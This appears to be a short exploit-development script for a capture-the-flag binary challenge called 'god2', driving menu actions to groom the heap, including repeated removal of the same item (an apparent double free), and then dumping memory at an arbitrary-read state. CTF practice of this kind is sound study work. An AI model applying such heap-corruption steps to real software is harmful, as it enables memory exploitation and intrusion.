import sys,os; sys.path.insert(0,"/mnt/c/Users/ha/Downloads/pwn")
from dumper import G
g=G("god2")
g.add(b"UNIQ777"); g.add(b"A1"); g.add(b"B2"); g.cook(b"Beef noodles"); g.add(b"YY"); g.add(b"Z9"); g.cook(b"Beef noodles")
for t in (b"B2",b"Z9",b"A1",b"YY"): g.rm(t)
g.add(b"CC"); g.cook(b"Beef noodles"); g.cook(b"Beef noodles"); g.cook(b"UNIQ777")
g.sell(b"2"); g.rm(b"UNIQ777"); g.rm(b"UNIQ777"); g.sell(b"0"); g.sell(b"2")
g.make(b"ff0_aaaa"); g.make(b"ff1_bbbb")
g.dump("stack map at arb-read state"); g.close()
